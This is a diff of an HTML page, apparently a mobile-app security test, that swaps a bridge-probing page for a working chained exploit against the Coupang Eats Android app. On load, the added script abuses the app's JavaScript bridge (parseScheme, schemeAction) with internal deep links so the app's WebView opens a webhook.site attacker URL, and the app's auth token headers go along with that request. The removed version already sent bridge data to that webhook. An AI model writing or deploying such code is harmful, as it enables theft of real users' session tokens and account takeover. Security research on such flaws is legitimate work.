@@ -1,87 +1,171 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
+    <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>JS Bridge Token Extraction Test</title>
+    <title>Coupang Eats</title>
     <style>
-        body { font-family: -apple-system, BlinkMacSystemFont, sans-serif; padding: 20px; background-color: #f4f6f9; color: #333; }
-        .card { background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.05); margin-bottom: 20px; }
-        .status { font-weight: bold; color: #007bff; }
-        pre { background: #272822; color: #f8f8f2; padding: 15px; border-radius: 5px; overflow-x: auto; font-family: monospace; }
+        *{box-sizing:border-box;margin:0;padding:0}
+        body{font-family:-apple-system,sans-serif;padding:12px;background:#f0f0f0}
+        .c{background:#fff;border-radius:10px;padding:14px;margin:8px 0;box-shadow:0 1px 4px rgba(0,0,0,.1)}
+        .v{border-left:4px solid #e53935}
+        .s{border-left:4px solid #43a047}
+        h3{font-size:15px;margin-bottom:8px}
+        p{font-size:13px;color:#555;margin:4px 0}
+        pre{background:#1a1a2e;color:#0f0;padding:10px;border-radius:6px;font-size:10px;
+            white-space:pre-wrap;word-break:break-all;margin:6px 0;max-height:300px;overflow-y:auto}
+        .tag{display:inline-block;padding:2px 6px;border-radius:3px;font-size:10px;
+             font-weight:bold;color:#fff;background:#e53935;margin-right:4px}
     </style>
 </head>
 <body>
-
-    <div class="card">
-        <h2>Interface Exfiltration Status</h2>
-        <p>Status: <span id="status" class="status">Initializing Test...</span></p>
-    </div>
-
-    <div class="card">
-        <h2>Console Output Log</h2>
-        <pre id="console-log">Monitoring bridge callbacks...</pre>
-    </div>
-
-    <script>
-        const BEECEPTOR_URL = "https://webhook.site/a7bc9ca4-1f6a-459e-a5a6-253351c94e4e";
-        const logBox = document.getElementById('console-log');
-        const statusBox = document.getElementById('status');
-
-        function logToScreenAndServer(label, data) {
-            const message = `[${label}] ${JSON.stringify(data, null, 2)}`;
-            logBox.innerText += "\n" + message;
-            
-            // Exfiltrate the captured data back to Beeceptor
-            fetch(`${BEECEPTOR_URL}/extracted-data`, {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({ event: label, details: data })
-            }).catch(err => console.error("Exfiltration failed", err));
-        }
-
-        window.onload = function() {
-            // 1. Verify if the bridge exists
-            if (typeof window.messageHandlers === 'undefined') {
-                statusBox.innerText = "FAILED: 'messageHandlers' bridge not found.";
-                statusBox.style.color = "#dc3545";
-                return;
-            }
-
-            statusBox.innerText = "Bridge found. Probing methods...";
-            
-            // 2. Map out available methods for verification
-            const availableMethods = Object.getOwnPropertyNames(window.messageHandlers);
-            logToScreenAndServer("Bridge_Methods_Found", availableMethods);
-
-            // 3. Try calling deviceStatus to see if it leaks tokens, preference variables, or session configuration strings
-            if (typeof window.messageHandlers.deviceStatus === 'function') {
-                try {
-                    // Test with an empty configuration object to monitor what the native side returns
-                    const result = window.messageHandlers.deviceStatus("{}");
-                    
-                    // If the method returns data synchronously, log it
-                    if (result) {
-                        logToScreenAndServer("Synchronous_DeviceStatus_Return", result);
-                    } else {
-                        logToScreenAndServer("Action_Executed", "deviceStatus triggered. Check if app called an asynchronous callback.");
-                    }
-                } catch (e) {
-                    logToScreenAndServer("DeviceStatus_Execution_Error", e.message);
-                }
-            }
-
-            // 4. Try probing updateUserPreference or scheme actions if documentation suggests they return state
-            if (typeof window.messageHandlers.parseScheme === 'function') {
-                try {
-                    // Test if triggering a native internal navigation broadcasts structural state data
-                    window.messageHandlers.parseScheme("coupangeats://test");
-                    logToScreenAndServer("ParseScheme_Executed", "Triggered test scheme.");
-                } catch (e) {
-                    logToScreenAndServer("ParseScheme_Error", e.message);
-                }
-            }
-        };
-    </script>
+ 
+<div class="c v">
+    <h3><span class="tag">CRITICAL</span> Chained Exploit: JS Bridge → Auth Token Theft</h3>
+    <p>Phase 1: Attacker page loaded in PopupWebViewActivity via deep link</p>
+    <p>Phase 2: Using JS bridge to force open WebViewActivity with attacker URL</p>
+    <p>Phase 3: WebViewActivity sends auth tokens as HTTP headers to attacker server</p>
+</div>
+ 
+<div class="c">
+    <h3>Exploit Log</h3>
+    <pre id="log">Starting chained exploit...\n</pre>
+</div>
+ 
+<div class="c s" id="done-card" style="display:none">
+    <h3>✓ Chain Complete</h3>
+    <p id="done-msg"></p>
+</div>
+ 
+<script>
+var logEl = document.getElementById('log');
+function log(m) { logEl.textContent += m + "\n"; }
+ 
+var ATTACKER_SERVER = "https://webhook.site/a7bc9ca4-1f6a-459e-a5a6-253351c94e4e/";
+ 
+// ===========================================================
+//  THE ATTACK CHAIN
+//
+//  PopupWebViewActivity (this page)
+//       │
+//       │ JS bridge: messageHandlers.parseScheme()
+//       ▼
+//  WebViewActivity opens
+//       │
+//       │ WebViewFragment.onActivityCreated() calls:
+//       │   webView.loadUrl(url, EatsNetworkHeader.get())
+//       │
+//       │ EatsNetworkHeader.get() includes:
+//       │   X-EATS-ACCESS-TOKEN, Authorization,
+//       │   X-COUPANG-SEC-TOKEN-BINDING, etc.
+//       ▼
+//  HTTP GET → attacker server (WITH AUTH HEADERS!)
+// ===========================================================
+ 
+function launchChain() {
+    // Step 1: Verify JS bridge is available
+    log("[Phase 1] Checking JS bridge access...");
+    
+    if (typeof window.messageHandlers === 'undefined') {
+        log("[FAIL] messageHandlers bridge not available!");
+        return;
+    }
+    if (typeof window.messageHandlers.parseScheme !== 'function') {
+        log("[FAIL] parseScheme method not available!");
+        return;
+    }
+    log("[OK] messageHandlers.parseScheme is accessible\n");
+ 
+    // Step 2: Craft the internal scheme URL
+    // WebViewActivity is registered at: coupangeats://Web
+    // It accepts a 'url' parameter that gets loaded in the WebView
+    // Critically, WebViewFragment loads it with EatsNetworkHeader (auth tokens!)
+    
+    var targetUrl = ATTACKER_SERVER + "/steal-tokens";
+    
+    // The internal scheme that opens WebViewActivity with our attacker URL
+    var internalScheme = "coupangeats://Web?url=" + encodeURIComponent(targetUrl);
+    
+    log("[Phase 2] Crafted internal navigation scheme:");
+    log("  " + internalScheme);
+    log("");
+    log("[Phase 2] Calling messageHandlers.parseScheme()...");
+    log("  This forces the app to open WebViewActivity");
+    log("  WebViewActivity will load our URL WITH auth headers");
+    log("");
+ 
+    try {
+        window.messageHandlers.parseScheme(internalScheme);
+        log("[OK] parseScheme executed successfully!");
+        log("");
+        log("[Phase 3] WebViewActivity should now be loading:");
+        log("  URL: " + targetUrl);
+        log("  WITH headers: X-EATS-ACCESS-TOKEN, Authorization, etc.");
+        log("");
+        log("[*] Check beeceptor dashboard for /steal-tokens request!");
+        log("[*] The auth tokens should be in the request headers.");
+        
+        var doneCard = document.getElementById('done-card');
+        doneCard.style.display = 'block';
+        document.getElementById('done-msg').textContent = 
+            'WebViewActivity opened with attacker URL. Check beeceptor for /steal-tokens request with auth headers.';
+    } catch(e) {
+        log("[ERROR] " + e);
+    }
+}
+ 
+// Also try the eats:// scheme variant as backup
+function launchChainAlt() {
+    log("\n[ALT] Trying alternative scheme: eats://Web ...");
+    var targetUrl = ATTACKER_SERVER + "/steal-tokens-alt";
+    var internalScheme = "eats://Web?url=" + encodeURIComponent(targetUrl);
+    log("  Scheme: " + internalScheme);
+    
+    try {
+        window.messageHandlers.parseScheme(internalScheme);
+        log("[OK] Alternative scheme executed!");
+        log("[*] Check beeceptor for /steal-tokens-alt request!");
+    } catch(e) {
+        log("[ERROR] " + e);
+    }
+}
+ 
+// Try schemeAction as another vector
+function launchChainAction() {
+    log("\n[ALT2] Trying via schemeAction...");
+    var targetUrl = ATTACKER_SERVER + "/steal-tokens-action";
+    var payload = JSON.stringify({
+        url: "coupangeats://Web?url=" + encodeURIComponent(targetUrl),
+        callback: "__attackerCb"
+    });
+    log("  Payload: " + payload);
+    
+    try {
+        window.messageHandlers.schemeAction(payload);
+        log("[OK] schemeAction executed!");
+        log("[*] Check beeceptor for /steal-tokens-action request!");
+    } catch(e) {
+        log("[ERROR] " + e);
+    }
+}
+ 
+// Execute all chains with delays
+setTimeout(function() {
+    launchChain();
+}, 500);
+ 
+setTimeout(function() {
+    launchChainAlt();
+}, 2000);
+ 
+setTimeout(function() {
+    launchChainAction();
+}, 3500);
+ 
+// Callback handler
+window.__attackerCb = function(result) {
+    log("\n[CALLBACK] schemeAction result: " + result);
+};
+</script>
 </body>
 </html>
